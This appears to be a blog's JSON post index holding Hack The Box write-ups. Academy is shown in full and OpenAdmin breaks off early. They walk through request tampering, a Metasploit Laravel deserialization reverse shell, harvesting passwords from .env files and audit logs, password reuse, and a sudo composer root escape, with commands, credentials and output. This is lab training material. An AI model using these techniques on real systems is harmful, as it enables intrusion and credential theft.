[ { "title": "Academy Writeup", "url": "/posts/academy/", "categories": "HTB, retired", "tags": "writeup", "date": "2021-02-22 01:38:56 +0100", "snippet": "Information@academy:~$ Column Detail Name Academy IP 10.10.10.215 Points 20 OS Linux Difficulty Easy Creator egre55 &amp; mrb3n Released on 7 Nov 2020 Retired on 27 Feb 2021 Brief@academy:~$At first i have to say that i totally recommend this box for beginners and for training purposes! It is quite awesome and i really enjoyed it everytime i rooted the box again.The box starts with TCP/22 and TCP/80 opened. The initial Nmap scan shows that there is a vhost configured which i had to add to our /etc/hosts file in order to access the website.The box allows to register new users which can be abused to gain higher privileges by intercepting the request with Burp Suite while creating a new user. This was possible by simply changing the role from 0 to 1. This new created user was able to login on http://academy.htb/admin.php which can be found by directory busting using Gobuster. The hint to do that was that the pages for registering a user and login are ending on .php.After successful login on the admin the subdomain dev-staging-01.academy.htb got revealed. Adding this to the /etc/hostsfile and accessing it, leaked information about the used Laravel database and also the secret API_KEY.These informations could be used to unserialize the Laravel Token by using an exploit within Metasploit to gain the initial foothold.Right after the foothold a password could be found by enumerating the vhost directories beneath /var/www/html stored in /academy/.env. The next step was to check the available users and if the password got reused. Which was the case and on this way it was possible to privilege escalate to cry0l1t3 and grab the user.txt.The way to root starts off by dropping linpeas.sh on the machine and finding a second password within a logfile. By testing the password on the user whose name was part of the newly found password the next privilege escalation to mrb3n could be archived.Beforming basic tests like sudo -l showed that mrb3n could execute /usr/bin/composer with sudo privileges. After checking the famous GTFObins and executing a script for restricted environments a shell as root got executed and the box was owned.Summary Starting with Nmap as always Adding the vhost from the output to /etc/hosts Intercepting the request with Burp Suite while registering a new user Changing his role from 0 to 1 Using Gobuster to find /admin and logging in with the new user Finding information about a second vhost and adding this one also to /etc/hosts Accessing the new vhost dev-staging-01.academy.htb to find information about the Laravel database and the secret API_KEY Using Laravel Token Deserialization within Metasploit to gain initial foothold Enumerating /var/www/html digging up a password in a .env file beneath /academy Privilege Escalation to cry0l1t3 Dropping linpeas.sh to find a password to privilege escalate to mrb3n Checking sudo abilities of mrb3n Searching on GTFObins for composer Executing a script for composer to get a shell as rootReconnaissanceNmap$ sudo nmap -A -T4 -sC -sV -oN initial 10.10.10.215Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 14:12 CETNmap scan report for 10.10.10.215Host is up (0.033s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)| 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)|_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://academy.htb/No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.91%E=4%D=12/15%OT=22%CT=1%CU=44343%PV=Y%DS=2%DC=T%G=Y%TM=5FD8B6OS:41%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPOS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DSTOS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=NOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%COS:D=S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 993/tcp)HOP RTT ADDRESS1 31.79 ms 10.10.14.12 32.35 ms 10.10.10.215OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.93 secondsAfter Nmap finished the scan i added academy.htb to my /etc/hosts file.$ cat /etc/hosts127.0.0.1 localhost127.0.1.1 kali10.10.10.215 academy.htbThen i started investigating the website. In the upper right corner of the website i spotted a LOGIN and REGISTER. Both forwarded me to .php-based websites. http://academy.htb/login.phphttp://academy.htb/register.phpI registered a new user and tried to login. Username Password test test After logging in i checked everything i could find but there was nothing special.So i decided to intercept the request with Burp Suite while creating a new user and take a closer look. Username Password testuser testuser Request:POST /register.php HTTP/1.1Host: academy.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 56Origin: http://academy.htbDNT: 1Connection: closeReferer: http://academy.htb/register.phpCookie: PHPSESSID=li0pnb6rt1ro9rtc5spb6ji8qjUpgrade-Insecure-Requests: 1Sec-GPC: 1uid=testuser&amp;password=testuser&amp;confirm=testuser&amp;roleid=0I modified the request to give myself the role id 1.Modified Request:POST /register.php HTTP/1.1Host: academy.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 56Origin: http://academy.htbDNT: 1Connection: closeReferer: http://academy.htb/register.phpCookie: PHPSESSID=li0pnb6rt1ro9rtc5spb6ji8qjUpgrade-Insecure-Requests: 1Sec-GPC: 1uid=testuser&amp;password=testuser&amp;confirm=testuser&amp;roleid=1I was able to login on the already found login page but nothing changed.So i assumed that there must be some sort of admin login. I started gobuster to search explicitly for .php files.$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://academy.htb -t 5 -e -s 200 -x php===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://academy.htb[+] Method: GET[+] Threads: 5[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php[+] Expanded: true[+] Timeout: 10s===============================================================2022/01/04 12:03:21 Starting gobuster in directory enumeration mode===============================================================http://academy.htb/images (Status: 301) [Size: 311] [--&gt; http://academy.htb/images/]http://academy.htb/index.php (Status: 200) [Size: 2117]http://academy.htb/home.php (Status: 302) [Size: 55034] [--&gt; login.php]http://academy.htb/login.php (Status: 200) [Size: 2627]http://academy.htb/register.php (Status: 200) [Size: 3003]http://academy.htb/admin.php (Status: 200) [Size: 2633]http://academy.htb/config.php (Status: 200) [Size: 0]http://academy.htb/server-status (Status: 403) [Size: 276]===============================================================2022/01/04 12:53:43 Finished===============================================================With the created and privilege evelated account testuser i was able to login on http://academy.htb/admin.php.After the login the page shows the following information. Item Status Complete initial set of modules (cry0l1t3 / mrb3n) done Finalize website design done Test all modules done Prepare launch campaign done Separate student and admin roles done Fix issue with dev-staging-01.academy.htb pending I added the new subdomain to my /etc/hosts file.$ cat /etc/hosts127.0.0.1 localhost127.0.1.1 kali10.10.10.215 academy.htb10.10.10.215 dev-staging-01.academy.htbFootholdingThe new vhost leaked the information that there is a Laravel database in use and also show the APP_KEY.UnexpectedValueException thrown with message \"The stream or file \"/var/www/html/htb-academy-dev-01/storage/logs/laravel.log\" could not be opened in append mode: failed to open stream: Permission denied\"Stacktrace:#10 UnexpectedValueException in /var/www/html/htb-academy-dev-01/vendor/monolog/monolog/src/Monolog/Handler/StreamHandler.php:110#9 Monolog\\Handler\\StreamHandler:write in /var/www/html/htb-academy-dev-01/vendor/monolog/monolog/src/Monolog/Handler/AbstractProcessingHandler.php:39#8 Monolog\\Handler\\AbstractProcessingHandler:handle in /var/www/html/htb-academy-dev-01/vendor/monolog/monolog/src/Monolog/Logger.php:344#7 Monolog\\Logger:addRecord in /var/www/html/htb-academy-dev-01/vendor/monolog/monolog/src/Monolog/Logger.php:712#6 Monolog\\Logger:error in /var/www/html/htb-academy-dev-01/vendor/laravel/framework/src/Illuminate/Log/Logger.php:176#5 Illuminate\\Log\\Logger:writeLog in /var/www/html/htb-academy-dev-01/vendor/laravel/framework/src/Illuminate/Log/Logger.php:87#4 Illuminate\\Log\\Logger:error in /var/www/html/htb-academy-dev-01/vendor/laravel/framework/src/Illuminate/Log/LogManager.php:526#3 Illuminate\\Log\\LogManager:error in /var/www/html/htb-academy-dev-01/vendor/laravel/framework/src/Illuminate/Foundation/Exceptions/Handler.php:113#2 Illuminate\\Foundation\\Exceptions\\Handler:report in /var/www/html/htb-academy-dev-01/app/Exceptions/Handler.php:39#1 App\\Exceptions\\Handler:report in /var/www/html/htb-academy-dev-01/vendor/laravel/framework/src/Illuminate/Foundation/Bootstrap/HandleExceptions.php:81#0 Illuminate\\Foundation\\Bootstrap\\HandleExceptions:handleException in [internal]:0APP_KEY: \"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=\"As next step i checked the metasploit database for available exploits.Metasploit$ msfconsoleUnable to handle kernel NULL pointer dereference at virtual address 0xd34db33fEFLAGS: 00010046eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60ds: 0018 es: 0018 ss: 0018Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)Stack: 90909090990909090990909090 90909090990909090990909090 90909090.90909090.90909090 90909090.90909090.90909090 90909090.90909090.09090900 90909090.90909090.09090900 .......................... cccccccccccccccccccccccccc cccccccccccccccccccccccccc ccccccccc................. cccccccccccccccccccccccccc cccccccccccccccccccccccccc .................ccccccccc cccccccccccccccccccccccccc cccccccccccccccccccccccccc .......................... ffffffffffffffffffffffffff ffffffff.................. ffffffffffffffffffffffffff ffffffff.................. ffffffff.................. ffffffff..................Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00Aiee, Killing Interrupt handlerKernel panic: Attempted to kill the idle task!In swapper task - not syncing =[ metasploit v6.1.21-dev ]+ -- --=[ 2187 exploits - 1160 auxiliary - 400 post ]+ -- --=[ 600 payloads - 45 encoders - 10 nops ]+ -- --=[ 9 evasion ]Metasploit tip: View missing module options with showmissingmsf6 &gt; search laravelMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/http/laravel_token_unserialize_exec 2018-08-07 excellent Yes PHP Laravel Framework token Unserialize Remote Command ExecutionInteract with a module by name or index. For example info 0, use 0 or use exploit/unix/http/laravel_token_unserialize_execmsf6 &gt; use 0[*] Using configured payload cmd/unix/reverse_perlmsf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; show optionsModule options (exploit/unix/http/laravel_token_unserialize_exec): Name Current Setting Required Description ---- --------------- -------- ----------- APP_KEY no The base64 encoded APP_KEY string from the .env file Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path to target webapp VHOST no HTTP server virtual hostPayload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automaticmsf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=APP_KEY =&gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set RHOSTS 10.10.10.215RHOSTS =&gt; 10.10.10.215msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set VHOST dev-staging-01.academy.htbVHOST =&gt; dev-staging-01.academy.htbmsf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set LHOST 10.10.14.14LHOST =&gt; 10.10.14.14msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set LPORT 9001LPORT =&gt; 9001msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; run[*] Started reverse TCP handler on 10.10.14.14:9001[*] Command shell session 1 opened (10.10.14.14:9001 -&gt; 10.10.10.215:55172 ) at 2022-01-04 14:43:07 +0000iduid=33(www-data) gid=33(www-data) groups=33(www-data)Got a comfy shell.python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@academy:/var/www/html/htb-academy-dev-01/public$EnumerationI started with the within the landing directory and worked my way up.There is a .env file which usually contains helpful information. I also remembered that i am currently investigatingsome sort of development environment.www-data@academy:/var/www/html/htb-academy-dev-01$ ls -lals -latotal 284drwxr-xr-x 12 root root 4096 Aug 13 2020 .drwxr-xr-x 4 root root 4096 Aug 13 2020 ..-rw-r--r-- 1 root root 702 Aug 13 2020 .env-rw-r--r-- 1 root root 651 Feb 7 2018 .env.example-rw-r--r-- 1 root root 111 Feb 7 2018 .gitattributes-rw-r--r-- 1 root root 155 Feb 7 2018 .gitignoredrwxr-xr-x 6 root root 4096 Feb 7 2018 app-rwxr-xr-x 1 root root 1686 Feb 7 2018 artisandrwxr-xr-x 3 root root 4096 Feb 7 2018 bootstrap-rw-r--r-- 1 root root 1513 Aug 13 2020 composer.json-rw-r--r-- 1 root root 193502 Aug 13 2020 composer.lockdrwxr-xr-x 2 root root 4096 Feb 7 2018 configdrwxr-xr-x 5 root root 4096 Feb 7 2018 database-rw-r--r-- 1 root root 1150 Feb 7 2018 package.json-rw-r--r-- 1 root root 1040 Feb 7 2018 phpunit.xmldrwxr-xr-x 4 root root 4096 Aug 13 2020 public-rw-r--r-- 1 root root 3622 Feb 7 2018 readme.mddrwxr-xr-x 5 root root 4096 Feb 7 2018 resourcesdrwxr-xr-x 2 root root 4096 Aug 13 2020 routes-rw-r--r-- 1 root root 563 Feb 7 2018 server.phpdrwxr-xr-x 5 root root 4096 Feb 7 2018 storagedrwxr-xr-x 4 root root 4096 Feb 7 2018 testsdrwxr-xr-x 38 root root 4096 Aug 13 2020 vendor-rw-r--r-- 1 root root 549 Feb 7 2018 webpack.mix.jsI started checking out the academy.htb virtual host environment.www-data@academy:/var/www/html$ ls -lals -latotal 20drwxr-xr-x 4 root root 4096 Aug 13 2020 .drwxr-xr-x 3 root root 4096 Aug 7 2020 ..drwxr-xr-x 12 www-data www-data 4096 Aug 13 2020 academydrwxr-xr-x 12 root root 4096 Aug 13 2020 htb-academy-dev-01-rw-r--r-- 1 www-data www-data 50 Aug 9 2020 index.phpwww-data@academy:/var/www/html/academy$ cat .envcat .envAPP_NAME=LaravelAPP_ENV=localAPP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=APP_DEBUG=falseAPP_URL=http://localhostLOG_CHANNEL=stackDB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=academyDB_USERNAME=devDB_PASSWORD=mySup3rP4s5w0rd!!BROADCAST_DRIVER=logCACHE_DRIVER=fileSESSION_DRIVER=fileSESSION_LIFETIME=120QUEUE_DRIVER=syncREDIS_HOST=127.0.0.1REDIS_PASSWORD=nullREDIS_PORT=6379MAIL_DRIVER=smtpMAIL_HOST=smtp.mailtrap.ioMAIL_PORT=2525MAIL_USERNAME=nullMAIL_PASSWORD=nullMAIL_ENCRYPTION=nullPUSHER_APP_ID=PUSHER_APP_KEY=PUSHER_APP_SECRET=PUSHER_APP_CLUSTER=mt1MIX_PUSHER_APP_KEY=\"${PUSHER_APP_KEY}\"MIX_PUSHER_APP_CLUSTER=\"${PUSHER_APP_CLUSTER}\"Password: mySup3rP4s5w0rd!!Privilege Escalation to cry0l1t3I got a password. Time to check the available users.www-data@academy:/var/www/html/academy$ cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinegre55:x:1000:1000:egre55:/home/egre55:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemrb3n:x:1001:1001::/home/mrb3n:/bin/shcry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/shmysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false21y4d:x:1003:1003::/home/21y4d:/bin/shch4p:x:1004:1004::/home/ch4p:/bin/shg0blin:x:1005:1005::/home/g0blin:/bin/shTrying if the password was reused by one of the users with a configured shell environment was the way to proceed.www-data@academy:/var/www/html/academy$ su - cry0l1t3su - cry0l1t3Password: mySup3rP4s5w0rd!!$user.txt$ cat user.txtcat user.txtbd47647a304cf0620aaba81d2b812086The way to rootI performed some basic checks like id and sudo -l to get more intel about the abilities of this user.$ ididuid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)$ sudo -lsudo -l[sudo] password for cry0l1t3: mySup3rP4s5w0rd!!Sorry, user cry0l1t3 may not run sudo on academy.linpeas.shIt is always a got idea to drop linpeas.sh on the target to get more information. https://github.com/carlospolop/PEASS-ng$ wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh--2022-01-04 14:57:17-- https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.shResolving github.com (github.com)... 140.82.121.4Connecting to github.com (github.com)|140.82.121.4|:443... connected.HTTP request sent, awaiting response... 302 FoundLocation: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/bc6d3b1c-520c-4377-a509-4e644fc1be3f?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220104%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220104T145658Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=172521501316838b10b005f01243c96038be77616cf75fe5233a0f8a3a5efecf&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=165548191&amp;response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type=application%2Foctet-stream [following]--2022-01-04 14:57:17-- https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/bc6d3b1c-520c-4377-a509-4e644fc1be3f?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220104%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220104T145658Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=172521501316838b10b005f01243c96038be77616cf75fe5233a0f8a3a5efecf&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=165548191&amp;response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type=application%2Foctet-streamResolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 762836 (745K) [application/octet-stream]Saving to: ‘linpeas.sh’linpeas.sh 100%[=======================================================================================================================================&gt;] 744.96K --.-KB/s in 0.1s2022-01-04 14:57:18 (5.84 MB/s) - ‘linpeas.sh’ saved [762836/762836]Starting a Python HTTP Server to provide the file.$ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...Got a comfy shell again.$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'python3 -c 'import pty;pty.spawn(\"/bin/bash\")'cry0l1t3@academy:~$At last i ran linpeas.sh within the /dev/shm/ directory.cry0l1t3@academy:/dev/shm$ wget http://10.10.14.14/linpeas.shwget http://10.10.14.14/linpeas.sh--2022-01-04 15:03:55-- http://10.10.14.14/linpeas.shConnecting to 10.10.14.14:80... connected.HTTP request sent, awaiting response... 200 OKLength: 762836 (745K) [text/x-sh]Saving to: ‘linpeas.sh’linpeas.sh 100%[===================&gt;] 744.96K 1.39MB/s in 0.5s2022-01-04 15:03:55 (1.39 MB/s) - ‘linpeas.sh’ saved [762836/762836]cry0l1t3@academy:/dev/shm$ chmod +x linpeas.shchmod +x linpeas.shcry0l1t3@academy:/dev/shm$ ./linpeas.sh1. 08/12/2020 02:28:10 83 0 ? 1 sh \"su mrb3n\",2. 08/12/2020 02:28:13 84 0 ? 1 su \"mrb3n_Ac@d3my!\",type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=\"su\" data=6D7262336E5F41634064336D79210APassword: mrb3n_Ac@d3my!Privilege Escalation to mrb3nObviously the password contained one of the already known usernames so i tried to directly log in as mrb3n via SSH.$ ssh mrb3n@10.10.10.215mrb3n@10.10.10.215's password:Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 04 Jan 2022 03:17:22 PM UTC System load: 0.0 Processes: 241 Usage of /: 38.6% of 13.72GB Users logged in: 0 Memory usage: 26% IPv4 address for ens160: 10.10.10.215 Swap usage: 0%89 updates can be installed immediately.42 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Tue Feb 9 14:20:36 2021$And again i performed the basic checks on the new user mrb3n.$ iduid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)$ sudo -l[sudo] password for mrb3n:Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser mrb3n may run the following commands on academy: (ALL) /usr/bin/composerPrivilege Escalation to rootThe composer binary is also included in the well known GTFObins. https://gtfobins.github.io/gtfobins/composer/I picked the option for the restricted environment to avoid any issues.$ TF=$(mktemp -d)echo '{\"scripts\":{\"x\":\"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3\"}}' &gt;$TF/composer.json$And all i had to do was to execute it.$ sudo /usr/bin/composer --working-dir=$TF run-script xPHP Warning: PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0PHP Warning: PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0Do not run Composer as root/super user! See https://getcomposer.org/root for details&gt; /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3# iduid=0(root) gid=0(root) groups=0(root)root.txt# cat /root/root.txt0239a863e6da74ccc2e10e9e3a0073e8THE ENDResources Topic URL PEASS-ng - Privilege Escalation Awesome Scripts SUITE new generation click here GTFOBins - composer click here " }, { "title": "OpenAdmin Writeup", "url": "/posts/openadmin/", "categories": "HTB, retired", "tags": "writeup", "date": "2020-11-06 01:38:56 +0100", "snippet": "Information@openadmin:~$ Column Detail Name OpenAdmin IP 10.10.10.171 Points 20 OS Linux Difficulty Easy Creator dmw0ng Released on 4 Jan 2020 Retired on 2 May 2020 Brief@openadmin:~$The box starts off with only port TCP/22 and TCP/80 open. After running gobuster against port 80, it revealed a /musicsubdirectory which provided information about the software OpenNetAdmin 18.1.1 running on it.By using an remote code execution exploit from exploit-db, it was possible to get a shell on the box.During some basic enumeration of the /var/www directory, the credentials for the privilege escalation to jimmy were foundin the file called database_settings.inc.php. With jimmy it was possible to access the internal directory.Within the directory a file called main.php revealed the information that the ssh private key for joanna can be optained byaccessing the main.php on the interal listening webserver.After generating a crackable hash out of the private key by using ssh2john, the password for the key could be cracked byusing john and the user flag could be taken.Due some basic privilege testing the information showed up that joanna was able to execute nano with root privileges.The last step was to find the command sequence on GTFObins and the box was owned.Summary Start off with Nmap as always Gobuster reveals the /music directory Get information about the software OpenNetAdmin Get the exploit for the remote code execution from exploit-db After getting a reverse shell, upgrade the shell Start with enumerating /var/www/ Find credentials in the database_settings.inc.php file Reuse the password for the user jimmy Enumerate the internal direcotry and find the main.php file Throw a curl request against the local listener to trigger the main.php file Optain the ssh private key for joanna Create a crackable hash using ssh2john Crack the password with john Login as joanna and take the user.txt Check the privileges of joanna and figure out that the user can start nano with sudo Get the command sequence for nano from GTFObins Execute it to pop a root shell and to optain the root.txtReconnaissanceNmap$ sudo nmap -sC -sV -oA nmap 10.10.10.171Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 18:28 CESTNmap scan report for 10.10.10.171Host is up (0.11s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)| 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)|_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 22.86 secondsWe notice that port 22/tcp and port 80/tcp are open.Gobuster$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://10.10.10.171/[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2020/04/25 18:51:23 Starting gobuster===============================================================/music (Status: 301)/artwork (Status: 301)FootholdingLet’s check the found directories and start with /music. http://10.10.10.171/musicWhen we click on login we are getting redirected. http://10.10.10.171/ona/By using google we find an available exploit on exploit-db. https://www.exploit-db.com/exploits/47691# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution# Date: 2019-11-19# Exploit Author: mattpascoe# Vendor Homepage: http://opennetadmin.com/# Software Link: https://github.com/opennetadmin/ona# Version: v18.1.1# Tested on: Linux# Exploit Title: 